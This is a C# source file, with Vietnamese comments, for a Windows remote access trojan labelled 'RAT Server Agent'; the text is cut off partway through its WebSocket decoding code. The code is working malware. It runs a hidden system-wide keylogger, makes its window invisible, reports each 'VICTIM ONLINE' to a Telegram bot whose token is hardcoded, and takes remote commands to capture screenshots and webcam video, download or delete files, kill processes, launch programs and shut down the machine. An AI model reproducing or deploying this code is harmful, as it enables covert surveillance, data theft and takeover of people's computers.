using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Management; 
using System.Text.Json; 
using System.Net.Http;
using System.Net.NetworkInformation; // Để dùng lệnh Ping
using System.Net.Http.Headers;
namespace ModernServer
{
    // ============ KEYLOGGER MODULE ============
    public class Keylogger
    {
        private static int _hookID = 0;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static bool _isCapturing = false;
        private static StringBuilder _logBuffer = new StringBuilder();
        private static Thread? _hookThread = null;
        // Khởi động hook hệ thống (bàn phím/mouse) và bắt đầu quá trình capture dữ liệu.
        public static void Start()
        {
            if (_hookID == 0)
            {
                _hookThread = new Thread(() =>
                {
                    _hookID = SetHook(_proc);
                    Application.Run();
                });
                _hookThread.SetApartmentState(ApartmentState.STA);
                _hookThread.IsBackground = true;
                _hookThread.Start();
            }
            _isCapturing = true;
        }
        // Tạm dừng quá trình capture dữ liệu.
        public static void Pause() => _isCapturing = false;
        // Lấy toàn bộ nội dung log hiện có và xóa bộ đệm log sau khi đọc.
        public static string FlushLog()
        {
            lock (_logBuffer)
            {
                if (_logBuffer.Length == 0) return "";
                string content = _logBuffer.ToString();
                _logBuffer.Clear();
                return content;
            }
        }
        // Cài đặt hook bàn phím mức thấp (low-level keyboard hook) cho toàn hệ thống.
        private static int SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule!)
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
        // Delegate định nghĩa chữ ký hàm callback xử lý sự kiện bàn phím mức thấp.
        private delegate int LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        // Hàm callback xử lý sự kiện nhấn phím từ hook bàn phím, ghi lại các phím được nhấn vào bộ đệm log khi đang ở trạng thái capture.
        private static int HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100 && _isCapturing)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                try
                {
                    Keys key = (Keys)vkCode;
                    lock (_logBuffer)
                    {
                        string keyStr = key.ToString();
                        
                        // Handle special keys
                        switch (key)
                        {
                            case Keys.Space:
                                _logBuffer.Append(" ");
                                break;
                            case Keys.Enter:
                                _logBuffer.Append("\n");
                                break;
                            case Keys.Tab:
                                _logBuffer.Append("\t");
                                break;
                            case Keys.Back:
                                if (_logBuffer.Length > 0)
                                    _logBuffer.Length--;
                                break;
                            default:
                                if (keyStr.Length == 1 && char.IsLetterOrDigit(keyStr[0]))
                                    _logBuffer.Append(keyStr);
                                else if (keyStr.Length > 1)
                                    _logBuffer.Append($"[{keyStr}]");
                                break;
                        }
                    }
                }
                catch { }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        // Khai báo hàm Windows API dùng để cài đặt hook (móc) sự kiện ở mức hệ thống.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        // Chuyển tiếp sự kiện hook cho hook tiếp theo trong chuỗi xử lý của hệ thống.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int CallNextHookEx(int hhk, int nCode, IntPtr wParam, IntPtr lParam);
        // Lấy handle của module (DLL/EXE) hiện tại đang được load trong tiến trình.
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }


    // ============ MAIN SERVER ============
    [SupportedOSPlatform("windows")]
    public partial class ServerForm : Form
    {
        // TcpListener dùng để lắng nghe kết nối mạng đến
        private TcpListener? _listener;

        // Nút bắt đầu chức năng chính của ứng dụng
        private Button _btnStart = null!;

        // Nhãn hiển thị trạng thái hệ thống
        private Label _lblStatus = null!;

        // Ô hiển thị log hoặc dữ liệu ghi nhận được
        private TextBox _txtLog = null!;

        // Thiết bị camera dùng để capture video
        private VideoCaptureDevice? _videoSource;

        // Thời điểm dừng quá trình ghi video
        private DateTime _stopRecordingTime;

        // Trạng thái cho biết hệ thống đang ghi video hay không
        private bool _isRecording = false;

        // Lưu ID cập nhật cuối cùng để tránh xử lý lại dữ liệu cũ
        private int _lastUpdateId = 0;

        // Lưu frame hình ảnh hiện tại từ camera
        private Bitmap? _currentFrame;

        // Đối tượng khóa để đồng bộ truy cập frame
        private readonly object _frameLock = new object();

        // Cơ chế đồng bộ để báo hiệu khi có frame mới
        private ManualResetEvent _frameEvent = new ManualResetEvent(false);

        // Khởi tạo ServerForm, tự động thực hiện các bước khởi động hệ thống: chờ mạng, đăng ký startup, báo danh Telegram, bật listener và khởi động server, đồng thời ẩn giao diện người dùng.
        public ServerForm()
        {
            InitializeComponent();
            
            DebugToFile("=================================");
            DebugToFile("SERVER.EXE KHỞI ĐỘNG!");
            new Thread(() =>
            {
                // 1. Chờ mạng sẵn sàng TRƯỚC KHI LÀM GÌ CẢ
                DebugToFile("Bước 1: Đợi mạng...");
                WaitForNetwork();
                DebugToFile("Mạng đã sẵn sàng!");

                // 2. Thêm vào Startup
                DebugToFile("Bước 2: Thêm vào Startup...");
                AddToStartup();

                // 3. Báo danh lần đầu
                DebugToFile("Bước 3: Báo danh Telegram...");
                ReportToTelegram();

                // 4. Bật Listener (QUAN TRỌNG: Phải sau khi báo danh)
                DebugToFile("Bước 4: Khởi động Telegram Listener...");
                StartTelegramListener();

                // 5. Khởi động WebSocket Server
                DebugToFile("Bước 5: Khởi động WebSocket Server...");
                Log(">> Auto-started");
                ServerLoop();
            })
            { IsBackground = true }.Start();

            // Tàng hình
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0;
        }

        // Chờ cho đến khi mạng Internet sẵn sàng bằng cách kiểm tra ping và kết nối HTTP, thử lại nhiều lần trước khi hết thời gian chờ.
        private void WaitForNetwork()
        {
            int maxRetries = 60; // Tối đa 60 lần = 5 phút
            int retryCount = 0;

            while (retryCount < maxRetries)
            {
                try
                {
                    // Test 1: Ping Google DNS
                    using (var ping = new Ping())
                    {
                        var result = ping.Send("8.8.8.8", 5000);
                        if (result.Status == IPStatus.Success)
                        {
                            DebugToFile($"✓ Ping thành công sau {retryCount} lần thử");
                            
                            // Test 2: Thử kết nối HTTP thực sự
                            using (HttpClient client = new HttpClient())
                            {
                                client.Timeout = TimeSpan.FromSeconds(5);
                                string test = client.GetStringAsync("https://api.ipify.org").Result;
                                DebugToFile($"✓ HTTP OK - IP: {test}");
                                return; // Mạng OK
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    DebugToFile($"Lần {retryCount + 1}: Chưa có mạng ({ex.Message})");
                }

                retryCount++;
                Thread.Sleep(5000); // Đợi 5 giây thử lại
            }

            DebugToFile("⚠ Hết thời gian chờ mạng!");
        }
        
        // Ghi thông điệp debug kèm thời gian vào file log trên Desktop.
        private void DebugToFile(string msg)
        {
            try
            {
                // Đường dẫn file log: C:\Users\TenBan\Desktop\rat_debug.txt
                string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "rat_debug.txt");
                string content = $"[{DateTime.Now:HH:mm:ss}] {msg}\n";
                File.AppendAllText(filepath, content);
            }
            catch { } // Nếu lỗi ghi file thì bỏ qua
        }

        // Ngăn người dùng đóng form; thay vào đó thu nhỏ và ẩn cửa sổ để ứng dụng tiếp tục chạy nền.
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;

                // Thay vì Hide, ta thu nhỏ và làm trong suốt
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Opacity = 0; // Làm cho vô hình
            }
            else
            {
                base.OnFormClosing(e);
            }
        }
        // ============ BÁO DANH ============
        private void ReportToTelegram(string targetChatId = "")
        {
            new Thread(() =>
            {
                string botToken = "8393288103:AAFyb7tZ1EVkzqwktDQdVSMHyeWKUM2flMI";
                string defaultChatId = "922691344";
                string chatId = string.IsNullOrEmpty(targetChatId) ? defaultChatId : targetChatId;

                // Biến kiểm soát vòng lặp
                bool sent = false;
                int attempt = 0;

                DebugToFile("=== BẮT ĐẦU QUY TRÌNH BÁO DANH (RETRY MODE) ===");

                // Vòng lặp thử lại vô hạn (hoặc giới hạn 50 lần) cho đến khi có mạng
                while (!sent && attempt < 50)
                {
                    attempt++;
                    try
                    {
                        // 1. Kiểm tra mạng trước khi làm gì cả
                        using (var ping = new System.Net.NetworkInformation.Ping())
                        {
                            var result = ping.Send("8.8.8.8", 3000);
                            if (result.Status != System.Net.NetworkInformation.IPStatus.Success)
                            {
                                if (attempt % 5 == 0) DebugToFile($"[Lần {attempt}] Chưa có mạng... Đợi tiếp.");
                                throw new Exception("No Internet"); // Ném lỗi để xuống catch
                            }
                        }

                        DebugToFile("-> Đã có mạng! Đang lấy thông tin...");

                        // 2. Lấy thông tin (Code cũ của bạn)
                        string pcName = Environment.MachineName;
                        string userName = Environment.UserName;
                        string osVer = Environment.OSVersion.ToString();
                        string localIP = "?";
                        string publicIP = "N/A";

                        try { using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0)) { socket.Connect("8.8.8.8", 65530); IPEndPoint? endPoint = socket.LocalEndPoint as IPEndPoint; localIP = endPoint?.Address.ToString() ?? "?"; } } catch { }
                        try { using (HttpClient client = new HttpClient()) { client.Timeout = TimeSpan.FromSeconds(10); publicIP = client.GetStringAsync("https://api.ipify.org").Result.Trim(); } } catch { }

                        // 3. Soạn tin
                        string msg = $"🚨 <b>VICTIM ONLINE! (Try #{attempt})</b>\n" +
                                     $"------------------\n" +
                                     $"💻 <b>PC:</b> {pcName}\n" +
                                     $"👤 <b>User:</b> {userName}\n" +
                                     $"📡 <b>LAN IP:</b> <code>{localIP}</code>\n" +
                                     $"🌍 <b>Public IP:</b> <code>{publicIP}</code>\n" +
                                     $"🕒 <b>Time:</b> {DateTime.Now}";

                        string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(msg)}&parse_mode=HTML";

                        // 4. Gửi đi
                        using (HttpClient client = new HttpClient())
                        {
                            client.Timeout = TimeSpan.FromSeconds(20);
                            var response = client.GetAsync(url).Result;

                            if (response.IsSuccessStatusCode)
                            {
                                DebugToFile("✓✓✓ GỬI TELEGRAM THÀNH CÔNG!");
                                sent = true; // Thoát vòng lặp
                            }
                            else
                            {
                                string err = response.Content.ReadAsStringAsync().Result;
                                DebugToFile($"✗ Lỗi API Telegram: {response.StatusCode} - {err}");
                                // Nếu lỗi API (sai Token/ChatID) thì thoát luôn, đừng thử lại vô ích
                                if (response.StatusCode == HttpStatusCode.Unauthorized || response.StatusCode == HttpStatusCode.BadRequest)
                                    return;

                                throw new Exception("API Failed"); // Ném lỗi để thử lại (nếu lỗi mạng)
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Nếu không phải lỗi "No Internet" thì mới ghi log chi tiết
                        if (ex.Message != "No Internet")
                            DebugToFile($"✗ Lỗi tạm thời: {ex.Message}");

                        Thread.Sleep(5000); // Ngủ 5 giây rồi thử lại
                    }
                }
            })
            { IsBackground = true }.Start();
        }


        
private void InitializeComponent()
        {
            this.SuspendLayout();

            // Button Start
            this._btnStart = new Button
            {
                Location = new Point(20, 20),
                Size = new Size(360, 50),
                Text = "START RAT AGENT (Port 5656)",
                Font = new Font("Consolas", 12, FontStyle.Bold),
                BackColor = Color.FromArgb(0, 255, 65),
                ForeColor = Color.Black,
                FlatStyle = FlatStyle.Flat
            };
            this._btnStart.FlatAppearance.BorderSize = 0;
            this._btnStart.Click += (s, e) =>
            {
                _btnStart.Enabled = false;
                _btnStart.Text = "AGENT RUNNING...";
                _btnStart.BackColor = Color.FromArgb(0, 150, 40);
                Log("Starting RAT Agent on port 5656...");
                new Thread(ServerLoop) { IsBackground = true }.Start();
            };

            // Label Status
            this._lblStatus = new Label
            {
                Location = new Point(20, 80),
                Size = new Size(360, 30),
                Text = "Status: Waiting to start...",
                Font = new Font("Consolas", 10),
                ForeColor = Color.LightGray,
                BackColor = Color.Transparent
            };

            // TextBox Log
            this._txtLog = new TextBox
            {
                Location = new Point(20, 120),
                Size = new Size(360, 200),
                Multiline = true,
                ReadOnly = true,
                ScrollBars = ScrollBars.Vertical,
                BackColor = Color.Black,
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 9),
                BorderStyle = BorderStyle.FixedSingle
            };

            // Form
            this.ClientSize = new Size(400, 340);
            this.Controls.Add(this._btnStart);
            this.Controls.Add(this._lblStatus);
            this.Controls.Add(this._txtLog);
            this.Text = "RAT Server Agent";
            this.BackColor = Color.FromArgb(20, 20, 20);
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;

            this.ResumeLayout(false);
        }

        // Ghi thông điệp log kèm thời gian lên TextBox, đảm bảo an toàn luồng khi cập nhật UI.
        private void Log(string message)
        {
            if (_txtLog.InvokeRequired)
            {
                _txtLog.Invoke(() => Log(message));
                return;
            }

            string timestamp = DateTime.Now.ToString("HH:mm:ss");
            _txtLog.AppendText($"[{timestamp}] {message}\r\n");
        }

        // Khởi động vòng lặp máy chủ, lắng nghe kết nối đến và xử lý mỗi kết nối trên một luồng riêng.
        private void ServerLoop()
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, 5656);
                _listener.Start();

                if (_lblStatus.InvokeRequired)
                    _lblStatus.Invoke(() => _lblStatus.Text = "Status: ONLINE - Listening for connections...");
                else
                    _lblStatus.Text = "Status: ONLINE - Listening for connections...";

                Log("Server started successfully!");
                Log("Waiting for client connections...");

                while (true)
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint!).Address.ToString();
                    Log($"New connection from: {clientIP}");

                    new Thread(() => HandleClient(client, clientIP)) { IsBackground = true }.Start();
                }
            }
            catch (Exception ex)
            {
                Log($"Server Error: {ex.Message}");
            }
        }
        // Xử lý toàn bộ vòng đời kết nối của một client WebSocket: handshake, gửi thông tin hệ thống và nhận lệnh điều khiển
        private void HandleClient(TcpClient client, string clientIP)
        {
            NetworkStream stream = client.GetStream();
            try
            {
                byte[] buffer = new byte[4096];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string header = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                if (PerformHandshake(stream, header))
                {
                    Log($"WebSocket handshake completed with {clientIP}");

                    // --- GỬI THÔNG TIN MÁY (INFO) ---
                    try
                    {
                        // 1. Gửi thông tin định danh ngắn gọn (INFO)
                        string pcName = Environment.MachineName;
                        string userName = Environment.UserName;
                        string osVer = Environment.OSVersion.ToString();
                        SendWS(stream, $"INFO|{pcName}|{userName}|{osVer}");

                        // 2. Gửi thông tin chi tiết (SYSINFO) - GỌI HÀM VỪA VIẾT Ở BƯỚC 3
                        string fullSpecs = GetSystemInfo();
                        SendWS(stream, "SYSINFO|" + fullSpecs);

                        Log("Sent system specs to client.");
                    }
                    catch { }
                    // --------------------------------

                    while (client.Connected)
                    {
                        string? msg = DecodeWebSocketMessage(stream);
                        if (msg == null) break;
                        ProcessCommand(stream, msg);
                    }
                }
            }
            catch (Exception ex) { Log($"Client Error: {ex.Message}"); }
            finally { client.Close(); }
        }

        //Hàm nhận chuỗi lệnh từ mạng, phân tích cú pháp, sau đó điều phối việc thực thi các chức năng tương ứng và gửi phản hồi lại qua NetworkStream
        private void ProcessCommand(NetworkStream stream, string cmd)
        {
            try
            {
                string[] parts = cmd.Split('|');
        
        // Cực kỳ quan trọng: Trim() xóa khoảng trắng, ToUpper() viết hoa toàn bộ
                string command = parts[0].Trim().ToUpper(); 
                
                // Debug: In ra chính xác lệnh nhận được (để trong ngoặc [] để thấy khoảng trắng nếu có)
                Log($"DEBUG: Nhận lệnh gốc=[{parts[0]}] -> Xử lý thành=[{command}]");



                switch (command)
                {
                    case "HOOK":
                        Keylogger.Start();
                        SendWS(stream, "LOG|>> Keylogger started successfully");
                        break;

                    case "UNHOOK":
                        Keylogger.Pause();
                        SendWS(stream, "LOG|>> Keylogger paused");
                        break;

                    case "KEYLOG":
                        string logs = Keylogger.FlushLog();
                        SendWS(stream, string.IsNullOrEmpty(logs) ? "LOG|>> No keystrokes captured yet" : "LOG|" + logs);
                        break;

                    case "TAKEPIC":
                        SendScreenshot(stream);
                        break;

                    // --- CHỈ GIỮ LẠI 1 CÁI CAM_STREAM NÀY THÔI ---
                    case "CAM_STREAM":
                        if (parts.Length > 1)
                        {
                            int duration = int.Parse(parts[1]);
                            StartWebcamStream(stream, duration);
                            Log($"Started streaming webcam for {duration} seconds");
                        }
                        break;
                    // ----------------------------------------------

                    case "PROCESS":
                        HandleProcessCommand(stream, parts);
                        break;

                    case "APP":
                        HandleAppCommand(stream, parts);
                        break;

                    case "SHUTDOWN":
                        SendWS(stream, "LOG|>> Shutdown command received");
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "shutdown",
                            Arguments = "/s /t 5",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        break;
                    case "FILE":
                        Log("DEBUG: --> Đã vào được CASE FILE!"); // Nếu thấy dòng này là switch ngon

                        if (parts.Length < 2) 
                        {
                            Log("DEBUG: Lỗi - Lệnh quá ngắn (thiếu tham số)");
                            break;
                        }

                        string subCmd = parts[1].Trim().ToUpper();
                        Log($"DEBUG: SubCommand=[{subCmd}]");

                        // Xử lý lệnh LIST (Xem ổ đĩa hoặc thư mục)
                        if (subCmd == "LIST")
                        {
                            // Trường hợp: FILE|LIST|DRIVES hoặc FILE|LIST|C:\
                            if (parts.Length > 2)
                            {
                                string path = string.Join("|", parts.Skip(2)).Trim();
                                // Xóa ký tự | dư thừa ở cuối nếu có
                                path = path.TrimEnd('|');

                                Log($"DEBUG: Đang lấy danh sách path=[{path}]");
                                
                                string data = GetFileExplorer(path); // Gọi hàm xử lý
                                
                                // Kiểm tra dữ liệu trả về có rỗng không
                                if (string.IsNullOrEmpty(data)) data = "ERROR|Khong co du lieu";

                                Log($"DEBUG: Kết quả lấy được dài {data.Length} ký tự");
                                SendWS(stream, "FILE|LIST|" + data);
                            }
                            else
                            {
                                Log("DEBUG: Lỗi - Thiếu đường dẫn (Path)");
                            }
                        }
                        // Xử lý lệnh GET (Tải file)
                        else if (subCmd == "GET")
                        {
                            string path = string.Join("|", parts.Skip(2)).Trim();
                            Log($"DEBUG: Đang tải file=[{path}]");
                            string base64 = ReadFileBase64(path);
                            SendWS(stream, "FILE|DOWNLOAD|" + base64);
                        }
                        // Xử lý lệnh DEL (Xóa file)
                        else if (subCmd == "DEL")
                        {
                            string path = string.Join("|", parts.Skip(2)).Trim();
                            try {
                                File.Delete(path);
                                SendWS(stream, "LOG|>> Da xoa file: " + path);
                            } catch (Exception ex) { SendWS(stream, "LOG|>> Loi xoa file: " + ex.Message); }
                        }
                        else
                        {
                            Log($"DEBUG: Không hiểu lệnh con [{subCmd}]");
                        }
                        break;
                        

                    case "RESET":
                        SendWS(stream, "LOG|>> Restart command received - System will reboot in 5 seconds");
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "shutdown",
                            Arguments = "/r /t 5", // /r là restart (Reboot)
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        break;
                    default:
                        SendWS(stream, $"LOG|>> Unknown command: {cmd}");
                        break;
                }
            }
            catch (Exception ex)
            {
                SendWS(stream, $"LOG|>> Error processing command: {ex.Message}");
                Log($"Command error: {ex.Message}");
            }
        }

        // Xử lý các lệnh liên quan đến tiến trình hệ thống (liệt kê hoặc thao tác theo yêu cầu).
        private void HandleProcessCommand(NetworkStream stream, string[] parts)
        {
            if (parts.Length < 2) return;

            string action = parts[1].ToUpper();

            if (action == "LIST")
            {
                var processes = Process.GetProcesses()
                    .Select(p => $"{p.ProcessName}:{p.Id}")
                    .ToArray();

                SendWS(stream, $"PROCESS|{string.Join(",", processes)}");
                Log($"Sent process list: {processes.Length} processes");
            }
            else if (action == "KILL" && parts.Length > 2)
            {
                try
                {
                    int pid = int.Parse(parts[2]);
                    Process proc = Process.GetProcessById(pid);
                    string procName = proc.ProcessName;
                    proc.Kill();
                    SendWS(stream, $"LOG|>> Process killed: {procName} (PID: {pid})");
                    Log($"Killed process: {procName} (PID: {pid})");
                }
                catch (Exception ex)
                {
                    SendWS(stream, $"LOG|>> Failed to kill process: {ex.Message}");
                }
            }
        }

        // Xử lý các lệnh liên quan đến ứng dụng: liệt kê ứng dụng đang chạy, ứng dụng đã cài đặt, đóng ứng dụng hoặc khởi chạy ứng dụng theo yêu cầu.
        private void HandleAppCommand(NetworkStream stream, string[] parts)
        {
            if (parts.Length < 2) return;

            string action = parts[1].ToUpper();

            // 1. Lấy danh sách đang chạy (Code cũ - đã sửa ở bước trước)
            if (action == "LIST")
            {
                var apps = Process.GetProcesses()
                    .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle))
                    .Select(p => $"{p.Id}§{p.ProcessName}§{p.MainWindowTitle}§{(p.Responding ? "Running" : "Not Responding")}")
                    .ToArray();
                SendWS(stream, $"APP|LIST|{string.Join("|||", apps)}");
            }
            // 2. TÍNH NĂNG MỚI: Lấy danh sách phần mềm ĐÃ CÀI ĐẶT
            else if (action == "INSTALLED")
            {
                string installedApps = GetInstalledApps();
                SendWS(stream, $"APP|INSTALLED|{installedApps}");
                Log("Sent installed applications list");
            }
            // 3. Kill App (Code cũ)
            else if (action == "KILL" && parts.Length > 2)
            {
                try
                {
                    int pid = int.Parse(parts[2]);
                    Process.GetProcessById(pid).Kill();
                    SendWS(stream, $"LOG|>> Killed PID: {pid}");
                    HandleAppCommand(stream, new string[] { "APP", "LIST" }); // Refresh list
                }
                catch (Exception ex) { SendWS(stream, $"LOG|>> Error: {ex.Message}"); }
            }
            // 4. Start App (Nâng cấp: Hỗ trợ chạy theo đường dẫn Full Path)
            else if (action == "START" && parts.Length > 2)
            {
                try
                {
                    // Nối lại các phần sau index 2 phòng trường hợp đường dẫn có chứa dấu |
                    string path = string.Join("|", parts.Skip(2));
                    Process.Start(path);
                    SendWS(stream, $"LOG|>> Launched: {path}");
                    Log($"Launched app: {path}");
                }
                catch (Exception ex) { SendWS(stream, $"LOG|>> Fail to launch: {ex.Message}"); }
            }
        }

        //Thu thập danh sách các phần mềm đã cài đặt trên Windows, kèm theo đường dẫn file thực thi
        private string GetInstalledApps()
        {
            var appList = new List<string>();

            string[] registryKeys = {
        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    };

            foreach (string keyPath in registryKeys)
            {
                using (RegistryKey? key = Registry.LocalMachine.OpenSubKey(keyPath))
                {
                    if (key == null) continue;

                    foreach (string subKeyName in key.GetSubKeyNames())
                    {
                        using (RegistryKey? subKey = key.OpenSubKey(subKeyName))
                        {
                            if (subKey == null) continue;

                            // FIX 3: Khai báo object? (có thể null)
                            object? nameObj = subKey.GetValue("DisplayName");
                            object? pathObj = subKey.GetValue("DisplayIcon");

                            // FIX 4: Kiểm tra null trước khi chuyển sang string
                            if (nameObj != null && pathObj != null)
                            {
                                string name = nameObj.ToString() ?? "";
                                string path = pathObj.ToString() ?? "";

                                if (string.IsNullOrEmpty(name) || string.IsNullOrEmpty(path)) continue;

                                // Xử lý đường dẫn (bỏ phần icon index ,0)
                                if (path.Contains(","))
                                    path = path.Split(',')[0];

                                path = path.Replace("\"", ""); // Bỏ dấu ngoặc kép

                                if (path.ToLower().EndsWith(".exe"))
                                {
                                    appList.Add($"{name}§{path}");
                                }
                            }
                        }
                    }
                }
            }

            // Thêm App mặc định
            appList.Add("Notepad§notepad.exe");
            appList.Add("Calculator§calc.exe");
            appList.Add("Command Prompt§cmd.exe");
            appList.Add("PowerShell§powershell.exe");
            appList.Add("Paint§mspaint.exe");

            appList.Sort();
            return string.Join("|||", appList.Distinct());
        }
        // Chụp ảnh màn hình hiện tại và gửi dữ liệu hình ảnh qua kết nối mạng.
        private void SendScreenshot(NetworkStream stream)
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen!.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        string base64 = Convert.ToBase64String(ms.ToArray());
                        SendWS(stream, "IMAGE|" + base64);
                        Log($"Screenshot sent ({ms.Length / 1024}KB)");
                    }
                }
            }
            catch (Exception ex)
            {
                SendWS(stream, $"LOG|>> Screenshot error: {ex.Message}");
                Log($"Screenshot error: {ex.Message}");
            }
        }

        // Khởi động luồng thu hình từ webcam trong một khoảng thời gian xác định và gửi dữ liệu hình ảnh qua kết nối mạng.
        private void StartWebcamStream(NetworkStream stream, int durationSeconds)
        {
            if (_isRecording) return; // Đang quay thì thôi

            _isRecording = true;
            _stopRecordingTime = DateTime.Now.AddSeconds(durationSeconds);

            new Thread(() =>
            {
                try
                {
                    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    if (videoDevices.Count == 0)
                    {
                        SendWS(stream, "LOG|>> No webcam detected.");
                        _isRecording = false;
                        return;
                    }

                    _videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                    // Sự kiện này sẽ chạy liên tục mỗi khi Camera có hình mới
                    _videoSource.NewFrame += (s, e) =>
                    {
                        if (!_isRecording) return;

                        // Kiểm tra hết giờ chưa
                        if (DateTime.Now > _stopRecordingTime)
                        {
                            StopCamera(); // Tự tắt
                            lock (stream) { SendWS(stream, "CAM_STOP"); } // Báo client dừng
                            return;
                        }

                        // Xử lý gửi ảnh
                        try
                        {
                            using (Bitmap bmp = (Bitmap)e.Frame.Clone())
                            using (MemoryStream ms = new MemoryStream())
                            {
                                // Giảm chất lượng ảnh xuống 50% để gửi cho nhanh (Video mượt hơn)
                                // Nếu muốn nét thì bỏ qua đoạn EncoderParameter này
                                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                                System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                                EncoderParameters myEncoderParameters = new EncoderParameters(1);
                                myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 50L); // 50% Quality

                                bmp.Save(ms, jpgEncoder, myEncoderParameters);

                                string base64 = Convert.ToBase64String(ms.ToArray());

                                lock (stream)
                                {
                                    SendWS(stream, "CAM|" + base64);
                                }
                            }
                        }
                        catch { }
                    };

                    _videoSource.Start();

                    // Giữ Thread sống trong khi đang quay
                    while (_isRecording && _videoSource.IsRunning)
                    {
                        Thread.Sleep(100);
                    }
                }
                catch (Exception ex)
                {
                    StopCamera();
                    SendWS(stream, $"LOG|>> Webcam Error: {ex.Message}");
                }
            }).Start();
        }

        // Hàm phụ trợ để nén ảnh JPEG (Copy đoạn này vào trong class ServerForm)
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid) return codec;
            }
            return null!;
        }

        // Dừng quá trình ghi hình từ webcam, giải phóng tài nguyên camera và đưa trạng thái ghi về false.
        private void StopCamera()
        {
            _isRecording = false;
            if (_videoSource != null && _videoSource.IsRunning)
            {
                _videoSource.SignalToStop();
                _videoSource.WaitForStop(); // Đợi tắt hẳn
                _videoSource = null;
            }
        }

        // ============ WEBSOCKET UTILITIES ============
        private bool PerformHandshake(NetworkStream stream, string header)
        {
            if (header.Contains("Upgrade: websocket"))
            {
                string key = Regex.Match(header, "Sec-WebSocket-Key: (.*)").Groups[1].Value.Trim();
                string acceptKey = key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
                byte[] hash = SHA1.HashData(Encoding.UTF8.GetBytes(acceptKey));
                string response = Convert.ToBase64String(hash);

                string handshakeResponse =
                    "HTTP/1.1 101 Switching Protocols\r\n" +
                    "Connection: Upgrade\r\n" +
                    "Upgrade: websocket\r\n" +
                    $"Sec-WebSocket-Accept: {response}\r\n\r\n";

                byte[] responseBytes = Encoding.UTF8.GetBytes(handshakeResponse);
                stream.Write(responseBytes, 0, responseBytes.Length);
                return true;
            }
            return false;
        }

        // Giải mã một WebSocket frame nhận từ NetworkStream:
        // đọc header, xác định độ dài payload, xử lý masking (client → server),
        // giải mã dữ liệu và trả về nội dung chuỗi UTF-8.
        // Trả về null nếu frame không hợp lệ hoặc xảy ra lỗi.
        private string? DecodeWebSocketMessage(NetworkStream stream)
        {
            try
            {
                byte[] header = new byte[2];
                int read = stream.Read(header, 0, 2);
                if (read < 2) return null;

                bool masked = (header[1] & 0b10000000) != 0;
                int payloadLength = header[1] & 0b01111111;

                if (payloadLength == 126)
                {
                    byte[] extLen = new byte[2];
                    stream.ReadExactly(extLen, 0, 2);
                    Array.Reverse(extLen);
                    payloadLength = BitConverter.ToUInt16(extLen, 0);
                }
                else if (payloadLength == 127)
                {
                    return null; // Too large
                }

                byte[] maskKey = new byte[4];
                if (masked)
                {
                    stream.ReadExactly(maskKey, 0, 4);
                }

                byte[] payload = new byte[payloadLength];
